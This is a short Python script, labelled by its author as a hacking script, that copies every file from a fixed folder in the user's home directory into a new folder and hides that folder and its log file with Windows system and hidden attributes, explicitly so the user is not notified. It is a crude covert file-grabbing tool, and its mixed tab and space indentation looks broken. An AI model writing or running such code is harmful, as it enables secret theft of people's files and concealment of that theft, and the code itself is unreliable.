#!/usr/bin/env python
# A hacking Script Written By: Samsruti Dash
# Used to Copy all files from one directory to another without notifying the user

# Ninja Samsruti :P

from os.path import expanduser
import os, shutil
import sys

def CopyFile(src, dest,f):
    f.write('\nFile Name: '+src)
    try:
        shutil.copy(src, dest)
    	f.write('\nCopied Successfully!')

    except shutil.Error as er:
        f.write('\nOops Error: %s' % er)
    
    except IOError as er:
        f.write('\nOops Error: %s' % er.strerror)


def main():
	name = 'log.txt'
	file = open(name,'a')  
	home = expanduser("~")
 	BASE_PATH =  home+'\\Desktop\\Python Game\\gui\\test2\\'
 	DES_PATH_NAME = os.path.dirname(os.path.abspath(__file__))
 	DES_PATH = os.path.join(DES_PATH_NAME,'NEW FOLDER')
 	if not os.path.exists(DES_PATH):
 		folderName = 'New Folder'
 	else:
 		folderName = 'New folder1'
 	
 	DES_PATH = os.path.join(DES_PATH_NAME,folderName)
 	os.makedirs(os.path.join(DES_PATH))
 	os.system('attrib +s +h "%s"' % folderName)	
 	#Folder is Hidden Completely
 	#To Unhide Run "attrib -s -h "New Folder""
 	listdir = os.listdir(BASE_PATH)    
   	for file_name in listdir:
   		full_file = os.path.join(BASE_PATH, file_name)
   		CopyFile(full_file, DES_PATH,file)
   	file.close()
   	os.system('attrib +s +h "log.txt"')	
   	os.system('explorer .')
    #When the copy is done, we can get a pop up notification by opening the same folder and hiding the required files/folders :P

if __name__ == "__main__":
    main()
